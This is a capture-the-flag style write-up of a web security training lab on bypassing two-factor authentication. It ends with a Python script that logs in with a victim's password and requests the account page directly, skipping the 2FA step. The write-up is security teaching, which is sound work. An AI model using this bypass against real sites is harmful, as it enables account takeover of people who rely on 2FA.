# Lab: 2FA simple bypass

This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

- Your credentials: wiener:peter
- Victim's credentials carlos:montoya

We log in with our credentials to observe the behavior of the site. It asks for a 2FA, we click on `Email client`, receive the `OTP`, access the `wiener` dashboard, and from there, we obtain the general path to the dashboards.

We log in with Carlos' credentials and see that it asks for a 2FA:
![image](https://github.com/user-attachments/assets/0e1ee201-4512-4f60-8c8b-26616ace93bb)

When we check the Burp history, we can see that the 2FA is processed after the login has been handled:
![image](https://github.com/user-attachments/assets/a681a079-25bf-4112-bc79-989d14d037a1)

We also see that the server returns a `302 Found` with the session cookie, which gives us a hint that the 2FA is processed after successfully logging in:
![image](https://github.com/user-attachments/assets/ff1215bb-1bd2-42f2-b128-4a40528b9434)


We navigate to the main dashboard of the user `carlos` and complete the lab:
![image](https://github.com/user-attachments/assets/70c8b194-7bd8-40ab-9b9a-d1b50a5a4297)

---
# Exploit

```python
import re
import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
session = requests.Session()
url = 'https://0a2000bd04de5848917b62f2000c004f.web-security-academy.net'

url_login = url + "/login"
data = {"username":"carlos", "password":"montoya"}
resp = session.post(url_login, data=data, verify=False, proxies=proxies)

url_carlos_account = url + "/my-account?id=carlos"
r_carlos_account = session.get(url_carlos_account, verify=False, proxies=proxies)

if r_carlos_account.status_code == 200:
    print("Congratulations, you solved the lab!")```
